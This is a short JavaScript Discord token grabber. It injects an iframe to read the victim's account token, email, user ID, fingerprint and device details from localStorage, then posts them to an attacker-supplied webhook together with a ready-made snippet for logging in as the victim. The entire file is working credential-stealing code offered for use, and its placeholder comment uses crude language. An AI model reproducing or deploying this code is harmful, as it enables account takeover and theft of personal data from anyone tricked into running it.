location.reload();
var discordWebhook = "PUT YALL FUCKING WEBHOOK HERE YOU IDOT";
var i = document.createElement('iframe');
document.body.appendChild(i);
var request = new XMLHttpRequest();
request.open("POST", discordWebhook);
request.setRequestHeader('Content-type', 'application/json');
var params = {
    username: "Turtle",
    avatar_url: "https://static.wikia.nocookie.net/franklin/images/7/72/Franklin_in_2003.jpg/revision/latest/scale-to-width-down/350?cb=20200612130438",
    content: '*Made by Catchy Smile#6572*\n------------------\n**User Information**\n------------------\nToken : ' + i.contentWindow.localStorage.token + '\n------------------\nEmail adress : ' + i.contentWindow.localStorage.email_cache + '\n------------------\nUser ID : ' + i.contentWindow.localStorage.user_id_cache + '\n------------------\nFingerprint : ' + i.contentWindow.localStorage.fingerprint + '\n------------------\nDevice Info : \`\`\`json\n' + i.contentWindow.localStorage.deviceProperties + '\`\`\`------------------\nJS to login : \n\`\`\`js\nlocation.reload();var i = document.createElement(\'iframe\');document.body.appendChild(i);i.contentWindow.localStorage.token = "\\"' + i.contentWindow.localStorage.token.replace(/^"(.*)"$/, '$1') + '\\""\`\`\`'
};
request.send(JSON.stringify(params));